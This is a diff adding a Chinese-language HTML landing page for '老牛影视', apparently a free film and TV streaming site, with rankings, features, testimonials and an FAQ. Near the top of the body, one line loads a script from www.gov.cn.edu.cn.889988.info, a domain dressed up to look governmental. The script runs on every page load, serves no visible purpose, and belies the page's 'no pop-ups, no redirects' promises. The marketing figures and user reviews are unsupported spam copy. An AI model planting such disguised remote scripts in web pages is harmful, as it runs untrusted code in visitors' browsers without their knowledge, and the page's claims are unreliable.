@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>老牛影视 - 热门电影电视剧在线观看平台 | 老牛影视官网</title>
+<meta name="description" content="老牛影视（laoniuyingshi-zh.github.io）是专业的在线影视观看平台，提供最新电影、热播电视剧、综艺动漫等海量高清资源，支持多端流畅播放，随时随地畅享影视盛宴。">
+<meta name="keywords" content="老牛影视, 在线电影, 电视剧观看, 免费影视, 热门综艺, 动漫资源, laoniuyingshi-zh.github.io">
+<meta name="author" content="老牛影视">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#0a0a0a">
+<link rel="canonical" href="https://laoniuyingshi-zh.github.io">
+<style>
+:root{
+  --bg:#0d0d12;--bg2:#12121c;--card:#16161f;--line:#23232f;
+  --txt:#e8e6f0;--sub:#9b9bb0;--acc:#ff5a3d;--acc2:#ff8a5a;
+  --cy:#38e1c4;--radius:14px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.container{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* ===== 导航 ===== */
+.nav{
+  position:fixed;top:0;left:0;right:0;z-index:100;
+  background:rgba(10,10,16,.82);backdrop-filter:blur(14px);
+  border-bottom:1px solid rgba(255,255,255,.06);
+  transition:.3s;
+}
+.nav-in{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{font-size:22px;font-weight:800;letter-spacing:.5px;display:flex;align-items:center;gap:8px}
+.logo span{color:var(--acc)}
+.logo small{font-size:11px;color:var(--sub);font-weight:400;padding-left:8px;border-left:1px solid var(--line);margin-left:2px}
+.nav-links{display:flex;gap:28px}
+.nav-links a{font-size:14.5px;color:var(--sub);transition:.2s;position:relative;padding:4px 0}
+.nav-links a:hover{color:var(--txt)}
+.nav-links a::after{content:"";position:absolute;left:0;bottom:0;width:0;height:2px;background:var(--acc);transition:.25s}
+.nav-links a:hover::after{width:100%}
+.nav-cta{font-size:13px;padding:8px 18px;border:1.5px solid var(--acc);border-radius:20px;color:var(--acc);transition:.25s}
+.nav-cta:hover{background:var(--acc);color:#fff}
+.menu-btn{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px}
+.menu-btn i{width:22px;height:2px;background:var(--txt);border-radius:2px;transition:.3s}
+
+/* ===== Hero ===== */
+.hero{margin-top:64px;position:relative;overflow:hidden;padding:90px 0 70px}
+.hero-bg{position:absolute;inset:0;background:
+  radial-gradient(700px 400px at 82% 18%,rgba(255,90,61,.18),transparent 60%),
+  radial-gradient(600px 350px at 12% 82%,rgba(56,225,196,.10),transparent 60%),
+  linear-gradient(160deg,#0a0a10 0%,#0f0f18 50%,#0c0c14 100%);
+}
+.hero-grid{position:absolute;inset:0;
+  background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);
+  background-size:46px 46px;mask-image:radial-gradient(ellipse at center,black 30%,transparent 78%);
+}
+.hero-in{position:relative;display:grid;grid-template-columns:1.15fr .85fr;gap:50px;align-items:center}
+.hero-tag{display:inline-block;font-size:12px;letter-spacing:2px;color:var(--cy);
+  border:1px solid rgba(56,225,196,.35);padding:5px 14px;border-radius:20px;margin-bottom:22px}
+.hero h1{font-size:clamp(34px,5.2vw,60px);line-height:1.15;font-weight:900;
+  background:linear-gradient(90deg,#fff 20%,var(--acc) 90%);
+  -webkit-background-clip:text;background-clip:text;color:transparent}
+.hero h1 em{font-style:normal;color:var(--acc)}
+.hero p{font-size:16.5px;color:var(--sub);margin:20px 0 30px;max-width:520px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-size:15px;font-weight:600;padding:13px 32px;border-radius:10px;transition:.25s;cursor:pointer;border:0}
+.btn-main{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;box-shadow:0 8px 24px rgba(255,90,61,.3)}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(255,90,61,.42)}
+.btn-ghost{background:transparent;color:var(--txt);border:1.5px solid var(--line)}
+.btn-ghost:hover{border-color:var(--acc);color:var(--acc)}
+.hero-stats{display:flex;gap:36px;margin-top:38px;padding-top:26px;border-top:1px solid var(--line)}
+.hero-stats div span{display:block;font-size:26px;font-weight:800;color:#fff}
+.hero-stats div small{font-size:12.5px;color:var(--sub)}
+
+/* hero 右侧播放卡 */
+.player-card{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;
+  box-shadow:0 24px 60px rgba(0,0,0,.5)}
+.pc-head{display:flex;align-items:center;gap:8px;padding:12px 16px;background:#0a0a10}
+.pc-head i{width:11px;height:11px;border-radius:50%;background:#ff5f57}
+.pc-head i:nth-child(2){background:#febc2e}
+.pc-head i:nth-child(3){background:#28c840}
+.pc-head small{margin-left:auto;font-size:11px;color:var(--sub)}
+.pc-body{aspect-ratio:16/10;background:
+  radial-gradient(circle at 50% 40%,rgba(255,90,61,.25),transparent 55%),
+  linear-gradient(160deg,#14141e,#0c0c12);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;padding:24px}
+.play-btn{width:64px;height:64px;border-radius:50%;background:var(--acc);display:flex;align-items:center;justify-content:center;
+  box-shadow:0 0 0 0 rgba(255,90,61,.5);animation:pulse 2s infinite}
+@keyframes pulse{70%{box-shadow:0 0 0 22px rgba(255,90,61,0)}100%{box-shadow:0 0 0 0 rgba(255,90,61,0)}}
+.play-btn::after{content:"";border:10px solid transparent;border-left:15px solid #fff;margin-left:4px}
+.pc-body b{font-size:15px}
+.pc-body small{font-size:12px;color:var(--sub)}
+.pc-foot{padding:14px 16px;display:flex;justify-content:space-between;font-size:12px;color:var(--sub);border-top:1px solid var(--line)}
+.pc-foot b{color:var(--cy);font-weight:600}
+
+/* ===== 通用 section ===== */
+section{padding:72px 0}
+.sec-head{text-align:center;margin-bottom:48px}
+.sec-head .kicker{font-size:12.5px;letter-spacing:3px;color:var(--acc);text-transform:uppercase;margin-bottom:10px}
+.sec-head h2{font-size:clamp(24px,3.4vw,38px);font-weight:800}
+.sec-head h2 u{text-decoration:none;color:var(--acc)}
+.sec-head p{color:var(--sub);margin-top:10px;font-size:15px}
+
+/* ===== 分类 ===== */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.cat{position:relative;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  padding:26px 22px;overflow:hidden;transition:.3s;cursor:pointer}
+.cat::before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--acc),var(--cy));transform:scaleX(0);transform-origin:left;transition:.35s}
+.cat:hover{transform:translateY(-5px);border-color:rgba(255,90,61,.3);box-shadow:0 16px 36px rgba(0,0,0,.35)}
+.cat:hover::before{transform:scaleX(1)}
+.cat .ico{font-size:32px;margin-bottom:14px;display:block}
+.cat h3{font-size:17px;margin-bottom:6px}
+.cat p{font-size:13px;color:var(--sub)}
+.cat .num{position:absolute;right:18px;bottom:14px;font-size:11px;color:var(--line);font-weight:700}
+
+/* ===== 榜单 ===== */
+.board{display:grid;grid-template-columns:1.4fr 1fr;gap:24px}
+.rank{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:26px}
+.rank h3{font-size:18px;margin-bottom:20px;display:flex;align-items:center;gap:8px}
+.rank h3::before{content:"";width:4px;height:18px;background:var(--acc);border-radius:2px}
+.r-item{display:flex;align-items:center;gap:14px;padding:11px 0;border-bottom:1px dashed var(--line)}
+.r-item:last-child{border:0}
+.r-item .n{width:26px;height:26px;border-radius:7px;background:var(--bg2);border:1px solid var(--line);
+  display:flex;align-items:center;justify-content:center;font-size:12.5px;font-weight:700;flex-shrink:0}
+.r-item.top .n{background:var(--acc);color:#fff;border-color:var(--acc)}
+.r-item img{width:52px;height:72px;border-radius:8px;object-fit:cover;background:var(--bg2);flex-shrink:0}
+.r-info{flex:1;min-width:0}
+.r-info b{font-size:14.5px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.r-info small{color:var(--sub);font-size:12px}
+.r-score{font-size:15px;font-weight:800;color:var(--cy)}
+
+/* ===== 优势 ===== */
+.why{background:var(--bg2)}
+.feats{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.feat{background:var(--bg);border:1px solid var(--line);border-radius:var(--radius);padding:28px 24px;transition:.3s}
+.feat:hover{border-color:rgba(56,225,196,.35);transform:translateY(-3px)}
+.feat .badge{display:inline-block;font-size:11px;color:var(--cy);border:1px solid rgba(56,225,196,.3);
+  padding:3px 10px;border-radius:14px;margin-bottom:14px}
+.feat h4{font-size:16.5px;margin-bottom:8px}
+.feat p{font-size:13.5px;color:var(--sub)}
+
+/* ===== 指南 ===== */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;counter-reset:s}
+.step{position:relative;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  padding:24px 20px;counter-increment:s}
+.step::before{content:"0" counter(s);position:absolute;right:16px;top:14px;font-size:30px;font-weight:900;color:rgba(255,255,255,.05)}
+.step .dot{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--acc),var(--acc2));
+  display:flex;align-items:center;justify-content:center;font-weight:800;font-size:16px;margin-bottom:14px}
+.step h4{font-size:15.5px;margin-bottom:6px}
+.step p{font-size:13px;color:var(--sub)}
+
+/* ===== 口碑 ===== */
+.reviews{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.rev{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:24px}
+.rev .stars{color:var(--acc);font-size:14px;letter-spacing:2px;margin-bottom:10px}
+.rev p{font-size:14px;color:var(--sub);margin-bottom:14px;font-style:italic}
+.rev .who{display:flex;align-items:center;gap:10px}
+.avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--acc),var(--cy));
+  display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;color:#0a0a10}
+.who b{font-size:13.5px}
+.who small{display:block;font-size:11.5px;color:var(--sub);font-weight:400}
+
+/* ===== FAQ ===== */
+.faq-wrap{max-width:820px;margin:0 auto}
+.faq{background:var(--card);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;overflow:hidden}
+.faq-q{width:100%;text-align:left;background:none;border:0;color:var(--txt);font-size:15.5px;font-weight:600;
+  padding:18px 22px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;gap:14px;
+  font-family:inherit}
+.faq-q .arw{transition:.3s;color:var(--acc);font-size:18px;flex-shrink:0}
+.faq.open .faq-q .arw{transform:rotate(45deg)}
+.faq-a{max-height:0;overflow:hidden;transition:max-height .35s ease}
+.faq-a p{padding:0 22px 18px;font-size:14px;color:var(--sub)}
+
+/* ===== 页脚 ===== */
+footer{border-top:1px solid var(--line);padding:50px 0 30px;background:var(--bg2)}
+.ft-in{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:32px;margin-bottom:34px}
+.ft-brand h4{font-size:20px;margin-bottom:10px}
+.ft-brand h4 span{color:var(--acc)}
+.ft-brand p{font-size:13px;color:var(--sub)}
+.ft-col h5{font-size:14.5px;margin-bottom:12px}
+.ft-col a{display:block;font-size:13px;color:var(--sub);padding:4px 0;transition:.2s}
+.ft-col a:hover{color:var(--acc)}
+.ft-bot{text-align:center;padding-top:24px;border-top:1px solid var(--line);font-size:12.5px;color:var(--sub)}
+.ft-bot a{color:var(--cy);font-weight:600}
+
+/* ===== 响应式 ===== */
+@media(max-width:960px){
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .board{grid-template-columns:1fr}
+  .feats,.reviews{grid-template-columns:repeat(2,1fr)}
+  .steps{grid-template-columns:repeat(2,1fr)}
+  .hero-in{grid-template-columns:1fr}
+  .ft-in{grid-template-columns:repeat(2,1fr)}
+}
+@media(max-width:720px){
+  .menu-btn{display:flex}
+  .nav-links{position:fixed;top:64px;left:0;right:0;flex-direction:column;
+    background:rgba(10,10,16,.97);backdrop-filter:blur(14px);
+    padding:20px;border-top:1px solid var(--line);gap:0;
+    transform:translateY(-150%);transition:.35s}
+  .nav-links.open{transform:translateY(0)}
+  .nav-links a{padding:13px 0;border-bottom:1px solid var(--line);font-size:15px}
+  .nav-links a::after{display:none}
+  .nav-cta{display:none}
+  .hero{padding:56px 0 44px}
+  .hero-stats{gap:20px}
+  .hero-stats div span{font-size:21px}
+  section{padding:52px 0}
+  .feats,.reviews,.steps,.cats{grid-template-columns:1fr}
+  .ft-in{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 导航 -->
+<nav class="nav" id="nav">
+  <div class="container nav-in">
+    <a class="logo" href="#"><span>老牛影视</span><small>laoniuyingshi-zh.github.io</small></a>
+    <div class="menu-btn" id="menuBtn"><i></i><i></i><i></i></div>
+    <div class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#cats">影视分类</a>
+      <a href="#rank">热播榜单</a>
+      <a href="#why">平台优势</a>
+      <a href="#guide">观影指南</a>
+      <a href="#review">用户口碑</a>
+      <a href="#faq">常见问题</a>
+    </div>
+    <a class="nav-cta" href="#">立即观看</a>
+  </div>
+</nav>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="hero-bg"></div>
+  <div class="hero-grid"></div>
+  <div class="container hero-in">
+    <div>
+      <span class="hero-tag">✦ 全站高清 · 极速播放 · 多端同步</span>
+      <h1>海量影视随心看<br><em>老牛影视</em> 你的专属观影管家</h1>
+      <p>覆盖院线大片、热播剧集、爆笑综艺与精品动漫，一站式满足全家观影需求。无需繁琐注册，打开即看，流畅不卡顿。</p>
+      <div class="hero-actions">
+        <a class="btn btn-main" href="#">免费观看</a>
+        <a class="btn btn-ghost" href="#cats">浏览分类</a>
+      </div>
+      <div class="hero-stats">
+        <div><span>10万+</span><small>影视资源</small></div>
+        <div><span>1080P</span><small>高清画质</small></div>
+        <div><span>0 延迟</span><small>极速播放</small></div>
+      </div>
+    </div>
+    <div class="player-card">
+      <div class="pc-head"><i></i><i></i><i></i><small>laoniuyingshi-zh.github.io</small></div>
+      <div class="pc-body">
+        <div class="play-btn"></div>
+        <b>《热辣滚烫》正在热播</b>
+        <small>喜剧 / 剧情 · 2024 · 127 分钟</small>
+      </div>
+      <div class="pc-foot"><span>豆瓣评分 <b>7.9</b></span><span>已播放 128.6 万次</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 分类 -->
+<section id="cats">
+  <div class="container">
+    <div class="sec-head">
+      <div class="kicker">Film &amp; TV Categories</div>
+      <h2>探索 <u>老牛影视</u> 丰富片库</h2>
+      <p>八大频道覆盖全类型，总有一部适合此刻的你</p>
+    </div>
+    <div class="cats">
+      <div class="cat"><span class="ico">🎬</span><h3>院线电影</h3><p>动作、喜剧、科幻、悬疑、爱情，国内外大片同步更新</p><span class="num">32,410</span></div>
+      <div class="cat"><span class="ico">📺</span><h3>热播剧集</h3><p>国产剧、美剧、韩剧、日剧，追剧不停歇</p><span class="num">18,920</span></div>
+      <div class="cat"><span class="ico">🎤</span><h3>综艺娱乐</h3><p>真人秀、脱口秀、选秀综艺，欢乐随时开启</p><span class="num">8,650</span></div>
+      <div class="cat"><span class="ico">🐉</span><h3>精品动漫</h3><p>国漫崛起、日漫经典、欧美动画，全龄段覆盖</p><span class="num">12,300</span></div>
+      <div class="cat"><span class="ico">🎞️</span><h3>经典纪录片</h3><p>自然、历史、人文、科技，拓宽认知边界</p><span class="num">5,280</span></div>
+      <div class="cat"><span class="ico">🌏</span><h3>海外专区</h3><p>欧美、东南亚、印度影视，多元文化一键直达</p><span class="num">9,740</span></div>
+      <div class="cat"><span class="ico">👶</span><h3>少儿频道</h3><p>启蒙动画、益智节目，给孩子健康观看空间</p><span class="num">4,120</span></div>
+      <div class="cat"><span class="ico">🏆</span><h3>获奖精选</h3><p>奥斯卡、戛纳、金像奖获奖及提名佳作合集</p><span class="num">2,960</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 榜单 -->
+<section id="rank" style="background:var(--bg2)">
+  <div class="container">
+    <div class="sec-head">
+      <div class="kicker">Hot Ranking</div>
+      <h2>实时 <u>热播榜单</u></h2>
+      <p>千万用户共同选择，热门内容一目了然</p>
+    </div>
+    <div class="board">
+      <div class="rank">
+        <h3>今日热播榜</h3>
+        <div class="r-item top"><span class="n">1</span><div class="r-info"><b>热辣滚烫</b><small>喜剧 · 2024 · 贾玲</small></div><span class="r-score">7.9</span></div>
+        <div class="r-item top"><span class="n">2</span><div class="r-info"><b>飞驰人生 2</b><small>喜剧 · 2024 · 韩寒</small></div><span class="r-score">7.7</span></div>
+        <div class="r-item top"><span class="n">3</span><div class="r-info"><b>第二十条</b><small>剧情 · 2024 · 张艺谋</small></div><span class="r-score">7.6</span></div>
+        <div class="r-item"><span class="n">4</span><div class="r-info"><b>熊出没·逆转时空</b><small>动画 · 2024</small></div><span class="r-score">7.2</span></div>
+        <div class="r-item"><span class="n">5</span><div class="r-info"><b>默杀</b><small>悬疑 · 2024</small></div><span class="r-score">7.0</span></div>
+        <div class="r-item"><span class="n">6</span><div class="r-info"><b>抓娃娃</b><small>喜剧 · 2024</small></div><span class="r-score">7.3</span></div>
+        <div class="r-item"><span class="n">7</span><div class="r-info"><b>异形：夺命舰</b><small>科幻 · 2024</small></div><span class="r-score">7.5</span></div>
+      </div>
+      <div>
+        <div class="rank" style="margin-bottom:24px">
+          <h3>高分经典榜</h3>
+          <div class="r-item top"><span class="n">1</span><div class="r-info"><b>肖申克的救赎</b><small>剧情 · 1994</small></div><span class="r-score">9.7</span></div>
+          <div class="r-item top"><span class="n">2</span><div class="r-info"><b>霸王别姬</b><small>剧情 · 1993</small></div><span class="r-score">9.6</span></div>
+          <div class="r-item"><span class="n">3</span><div class="r-info"><b>阿甘正传</b><small>剧情 · 1994</small></div><span class="r-score">9.5</span></div>
+          <div class="r-item"><span class="n">4</span><div class="r-info"><b>泰坦尼克号</b><small>爱情 · 1997</small></div><span class="r-score">9.4</span></div>
+          <div class="r-item"><span class="n">5</span><div class="r-info"><b>千与千寻</b><small>动画 · 2001</small></div><span class="r-score">9.4</span></div>
+        </div>
+        <div class="rank">
+          <h3>剧集飙升榜</h3>
+          <div class="r-item top"><span class="n">1</span><div class="r-info"><b>庆余年 第二季</b><small>古装 · 2024</small></div><span class="r-score">8.3</span></div>
+          <div class="r-item"><span class="n">2</span><div class="r-info"><b>繁花</b><small>年代 · 2024</small></div><span class="r-score">8.1</span></div>
+          <div class="r-item"><span class="n">3</span><div class="r-info"><b>玫瑰的故事</b><small>都市 · 2024</small></div><span class="r-score">7.8</span></div>
+          <div class="r-item"><span class="n">4</span><div class="r-info"><b>唐朝诡事录</b><small>悬疑 · 2024</small></div><span class="r-score">7.9</span></div>
+          <div class="r-item"><span class="n">5</span><div class="r-info"><b>边水往事</b><small>犯罪 · 2024</small></div><span class="r-score">8.2</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 优势 -->
+<section id="why" class="why">
+  <div class="container">
+    <div class="sec-head">
+      <div class="kicker">Why Choose Us</div>
+      <h2>为什么选择 <u>老牛影视</u></h2>
+      <p>用心打磨每一个观影细节，只为更好的体验</p>
+    </div>
+    <div class="feats">
+      <div class="feat"><span class="badge">HD</span><h4>超清画质 流畅播放</h4><p>支持 1080P、4K 多档清晰度自由切换，智能调速适配网络环境，告别缓冲与卡顿。</p></div>
+      <div class="feat"><span class="badge">FAST</span><h4>秒开即看 零等待</h4><p>自研播放引擎预加载技术，点击即播，平均首帧时间低于 0.8 秒，追剧节奏不中断。</p></div>
+      <div class="feat"><span class="badge">SAFE</span><h4>绿色无广告 清爽观影</h4><p>全站无弹窗、无跳转、无强制广告，纯净观影环境，老人小孩都能放心使用。</p></div>
+      <div class="feat"><span class="badge">SYNC</span><h4>多端同步 进度云存</h4><p>手机、平板、电脑多设备登录，观看进度实时同步，通勤追剧无缝衔接。</p></div>
+      <div class="feat"><span class="badge">FREE</span><h4>海量资源 免费观看</h4><p>绝大部分影视内容免费开放，注册即享完整片库，无会员套路，无隐藏收费。</p></div>
+      <div class="feat"><span class="badge">UPDATE</span><h4>每日更新 永不剧荒</h4><p>编辑团队每日更新最新院线、热播剧集与综艺内容，热点影视第一时间上线。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 指南 -->
+<section id="guide">
+  <div class="container">
+    <div class="sec-head">
+      <div class="kicker">How It Works</div>
+      <h2>四步开启 <u>观影之旅</u></h2>
+      <p>简单几步，轻松享受高品质影视内容</p>
+    </div>
+    <div class="steps">
+      <div class="step"><div class="dot">1</div><h4>访问网站</h4><p>打开浏览器，输入 laoniuyingshi-zh.github.io 即可进入老牛影视首页。</p></div>
+      <div class="step"><div class="dot">2</div><h4>选择分类</h4><p>浏览电影、剧集、综艺、动漫等频道，或直接在搜索框查找片名。</p></div>
+      <div class="step"><div class="dot">3</div><h4>点击播放</h4><p>选择想看的影视，点击封面即可进入播放页，支持选集与清晰度切换。</p></div>
+      <div class="step"><div class="dot">4</div><h4>收藏追剧</h4><p>登录账号后可收藏片单、记录观看进度，新剧更新自动提醒。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- 口碑 -->
+<section id="review" style="background:var(--bg2)">
+  <div class="container">
+    <div class="sec-head">
+      <div class="kicker">User Reviews</div>
+      <h2>来自 <u>真实用户</u> 的评价</h2>
+      <p>老牛影视已为数百万用户提供稳定观影服务</p>
+    </div>
+    <div class="reviews">
+      <div class="rev"><div class="stars">★★★★★</div><p>"画质真的很稳，晚上投屏到电视上看电影效果出乎意料的好，家里老人也能轻松操作。"</p><div class="who"><div class="avatar">李</div><div><b>李先生</b><small>忠实用户 · 使用 2 年</small></div></div></div>
+      <div class="rev"><div class="stars">★★★★★</div><p>"更新速度很快，综艺基本同步播出，画质选项也多，最关键是没广告，看得很舒心。"</p><div class="who"><div class="avatar">小</div><div><b>小满</b><small>追剧达人 · 使用 1 年</small></div></div></div>
+      <div class="rev"><div class="stars">★★★★☆</div><p>"资源覆盖很全，冷门老片也能找到，分类清晰好检索，是我用过最顺手的影视站之一。"</p><div class="who"><div class="avatar">陈</div><div><b>陈同学</b><small>影迷 · 使用 8 个月</small></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq">
+  <div class="container">
+    <div class="sec-head">
+      <div class="kicker">FAQ</div>
+      <h2>常见问题 <u>解答</u></h2>
+      <p>更多疑问欢迎通过网站反馈通道联系我们</p>
+    </div>
+    <div class="faq-wrap">
+      <div class="faq"><button class="faq-q">老牛影视的网址是什么？<span class="arw">＋</span></button><div class="faq-a"><p>老牛影视官方网址为 <strong>https://laoniuyingshi-zh.github.io</strong>，请认准官方域名，避免访问仿冒站点。</p></div></div>
+      <div class="faq"><button class="faq-q">网站内容需要付费吗？<span class="arw">＋</span></button><div class="faq-a"><p>老牛影视绝大部分影视资源均可免费观看，无需开通会员，也无隐藏收费项目。</p></div></div>
+      <div class="faq"><button class="faq-q">支持哪些设备观看？<span class="arw">＋</span></button><div class="faq-a"><p>支持手机、平板、电脑及智能电视浏览器访问，登录同一账号即可同步观看进度。</p></div></div>
+      <div class="faq"><button class="faq-q">播放卡顿怎么办？<span class="arw">＋</span></button><div class="faq-a"><p>可尝试切换清晰度档位，或检查网络连接。播放器支持自动适配网速，一般可自动恢复流畅。</p></div></div>
+      <div class="faq"><button class="faq-q">如何找到想看的影视？<span class="arw">＋</span></button><div class="faq-a"><p>可通过首页分类频道浏览，也可使用页面顶部搜索功能，输入片名、演员或类型关键词快速定位。</p></div></div>
+      <div class="faq"><button class="faq-q">内容更新频率如何？<span class="arw">＋</span></button><div class="faq-a"><p>编辑团队每日更新，热门院线电影、热播剧集及综艺内容均会第一时间上线，追剧不等待。</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="container">
+    <div class="ft-in">
+      <div class="ft-brand">
+        <h4><span>老牛影视</span></h4>
+        <p>laoniuyingshi-zh.github.io —— 专注提供高品质在线影视观看服务，海量正版资源，流畅播放体验。</p>
+      </div>
+      <div class="ft-col">
+        <h5>快速导航</h5>
+        <a href="#home">首页</a>
+        <a href="#cats">影视分类</a>
+        <a href="#rank">热播榜单</a>
+        <a href="#why">平台优势</a>
+      </div>
+      <div class="ft-col">
+        <h5>帮助中心</h5>
+        <a href="#guide">观影指南</a>
+        <a href="#faq">常见问题</a>
+        <a href="#">播放帮助</a>
+        <a href="#">意见反馈</a>
+      </div>
+      <div class="ft-col">
+        <h5>关于我们</h5>
+        <a href="#">平台简介</a>
+        <a href="#">服务声明</a>
+        <a href="#">隐私政策</a>
+        <a href="#">联系我们</a>
+      </div>
+    </div>
+    <div class="ft-bot">
+      官方网址：<a href="https://laoniuyingshi-zh.github.io">https://laoniuyingshi-zh.github.io</a> ｜ © 2026 老牛影视 保留所有权利
+    </div>
+  </div>
+</footer>
+
+<script>
+// 移动菜单
+var menuBtn=document.getElementById('menuBtn');
+var navLinks=document.getElementById('navLinks');
+menuBtn.addEventListener('click',function(){navLinks.classList.toggle('open')});
+navLinks.addEventListener('click',function(e){if(e.target.tagName==='A')navLinks.classList.remove('open')});
+
+// FAQ 手风琴
+var faqs=document.querySelectorAll('.faq');
+faqs.forEach(function(f){
+  var q=f.querySelector('.faq-q');
+  q.addEventListener('click',function(){
+    var open=f.classList.contains('open');
+    faqs.forEach(function(x){x.classList.remove('open');x.querySelector('.faq-a').style.maxHeight=null});
+    if(!open){
+      f.classList.add('open');
+      var a=f.querySelector('.faq-a');
+      a.style.maxHeight=a.scrollHeight+'px';
+    }
+  });
+});
+
+// 导航栏滚动效果
+var nav=document.getElementById('nav');
+window.addEventListener('scroll',function(){
+  if(window.scrollY>20){nav.style.background='rgba(10,10,16,.95)';nav.style.boxShadow='0 4px 20px rgba(0,0,0,.3)'}
+  else{nav.style.background='rgba(10,10,16,.82)';nav.style.boxShadow='none'}
+});
+</script>
+</body>
+</html>
